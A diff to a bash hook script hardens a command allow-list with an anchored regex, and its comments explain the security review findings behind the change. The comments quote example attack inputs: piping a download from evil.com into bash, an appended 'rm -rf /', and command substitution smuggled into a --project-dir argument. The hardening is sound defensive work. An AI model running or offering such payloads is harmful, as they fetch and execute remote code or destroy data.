@@ -116,9 +116,54 @@ if [ -f "$SCRIPT_DIR/lib/python-runner.sh" ]; then
   fi
 fi
 
-case "$COMMAND" in
-  *rein-bootstrap-project.py*--project-dir*) exit 0 ;;
-esac
+# Anchored allow-list (LOW-1, security review of v1.3.0): require the command
+# to START with `python` (or `python3`) after optional leading whitespace, the
+# script path token to END with `rein-bootstrap-project.py` (optionally
+# quoted), and `--project-dir` to appear as a standalone flag (preceded by
+# whitespace). The previous unanchored glob (`*rein-bootstrap-project.py*--
+# project-dir*`) matched the substring anywhere in the command, so a payload
+# like `curl evil.com | bash # python3 .../rein-bootstrap-project.py
+# --project-dir /` would have been allowed even though the actual shell
+# parser ignores everything after `#`. No concrete exploit was reported, but
+# this is defense-in-depth: the allow-list now only matches commands whose
+# *first executable token* is python invoking the bootstrap script.
+#
+# Regex breakdown — the pattern anchors BOTH ends so the command must be
+# *exactly* the bootstrap invocation emitted by bootstrap-check.sh
+# (`python3 "<script>" --project-dir "<dir>"`) with nothing appended.
+#
+# An end anchor is mandatory: without `$`, `... --project-dir /x && rm -rf /`
+# would match the prefix and be allowed, then the shell still runs the tail.
+# (codex integration review High, Task C.)
+#
+# Both the script path and the --project-dir value use a 3-way alternation so
+# QUOTED paths may contain spaces (macOS / user repos legitimately have spaces
+# in their path) while UNQUOTED forms still forbid whitespace.
+#
+# Per-branch forbidden characters (codex integration review Rounds 1-3):
+#   - double-quoted branch: forbids `"` (enclosing), `$` and backtick. In Bash,
+#     double quotes still evaluate `$(...)`, `$VAR`, and backtick command
+#     substitution — so `--project-dir "$(touch /tmp/pwn)"` would run shell
+#     before python. `\` is also forbidden (it is special inside dquotes).
+#   - single-quoted branch: forbids only `'` (enclosing). Single quotes make
+#     EVERYTHING literal in Bash — no expansion is possible inside them.
+#   - unquoted branch: forbids whitespace, both quotes, and the full shell
+#     metacharacter set (`; $ backtick & | < > ( ) { } \`) — an unquoted token
+#     can otherwise carry `&&`, redirects, subshells, or substitution.
+# Both ends stay anchored (`^` … `[[:space:]]*$`) so nothing can be appended.
+#
+#   ^[[:space:]]*               leading whitespace only — no commands before
+#   python3?                    `python` or `python3`
+#   [[:space:]]+                whitespace separator
+#   ( "…py" | '…py' | …py )     script path — dquoted / squoted / unquoted
+#   [[:space:]]+                whitespace separator
+#   --project-dir               the required flag (no intervening tokens)
+#   [[:space:]=]+               separator before the value (space or `=`)
+#   ( "…" | '…' | … )           dir value — dquoted / squoted / unquoted
+#   [[:space:]]*$               trailing whitespace then END — nothing appended
+if [[ "$COMMAND" =~ ^[[:space:]]*python3?[[:space:]]+(\"[^\"\$\`\\]*rein-bootstrap-project\.py\"|\'[^\']*rein-bootstrap-project\.py\'|[^[:space:]\"\'\;\$\`\&\|<>(){}\\]*rein-bootstrap-project\.py)[[:space:]]+--project-dir[[:space:]=]+(\"[^\"\$\`\\]+\"|\'[^\']+\'|[^[:space:]\"\'\;\$\`\&\|<>(){}\\]+)[[:space:]]*$ ]]; then
+  exit 0
+fi
 
 # ---------------------------------------------------------------------------
 # Invoke helper, preserving stdout (including trailing newline)
